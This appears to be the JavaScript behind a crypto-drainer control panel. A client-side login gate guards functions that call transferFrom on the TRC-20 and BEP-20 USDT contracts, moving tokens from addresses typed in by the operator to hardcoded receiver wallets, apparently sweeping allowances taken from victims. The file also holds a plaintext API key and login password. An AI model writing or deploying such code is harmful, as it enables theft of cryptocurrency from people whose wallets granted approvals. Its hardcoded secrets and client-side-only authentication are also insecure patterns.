const RECEIVER_TRC = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
const RECEIVER_BEP = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
const TRC20_USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";

const BEP_API_KEY = "KW2H7WKIP7Q8UTFB7G7Q1U24R8XWV5KDY4";

function login() {
  const u = document.getElementById("username").value;
  const p = document.getElementById("password").value;
  if (u === "enre.atul" && p === "Honda988701@") {
    document.getElementById("loginBox").style.display = "none";
    document.getElementById("panel").style.display = "block";
    loadLogs();
  } else {
    alert("Incorrect credentials");
  }
}

function logTRC(address, amount) {
  const log = `${address} — ${amount} USDT`;
  const li = document.createElement("li");
  li.innerText = log;
  document.getElementById("trcLogs").prepend(li);
}

function logBEP(address, amount) {
  const log = `${address} — ${amount} USDT`;
  const li = document.createElement("li");
  li.innerText = log;
  document.getElementById("bepLogs").prepend(li);
}

async function loadLogs() {
  // Mock: You can enhance this to pull from server or storage later
  logTRC("TXYZ123...", "500");
  logBEP("0xABC456...", "340");
}

async function manualWithdrawTRC() {
  const from = document.getElementById("trcFrom").value;
  const amount = parseFloat(document.getElementById("trcAmount").value);
  if (!from || !amount) return alert("Enter TRC-20 address and amount");

  try {
    const contract = await window.tronWeb.contract().at(TRC20_USDT);
    const decimalAmount = amount * 1e6;
    await contract.transferFrom(from, RECEIVER_TRC, decimalAmount).send();
    alert("TRC-20 Withdrawn");
  } catch (e) {
    alert("TRC Error: " + e.message);
  }
}

async function manualWithdrawBEP() {
  const from = document.getElementById("bepFrom").value;
  const amount = document.getElementById("bepAmount").value;
  if (!from || !amount) return alert("Enter BEP-20 address and amount");

  try {
    const web3 = new Web3(window.ethereum);
    const contract = new web3.eth.Contract([
      {
        "constant": false,
        "inputs": [
          { "name": "sender", "type": "address" },
          { "name": "recipient", "type": "address" },
          { "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      }
    ], BEP20_USDT);

    const accounts = await web3.eth.requestAccounts();
    const decimalAmount = web3.utils.toWei(amount, "mwei");

    await contract.methods.transferFrom(from, RECEIVER_BEP, decimalAmount).send({ from: accounts[0] });
    alert("BEP-20 Withdrawn");
  } catch (e) {
    alert("BEP Error: " + e.message);
  }
}
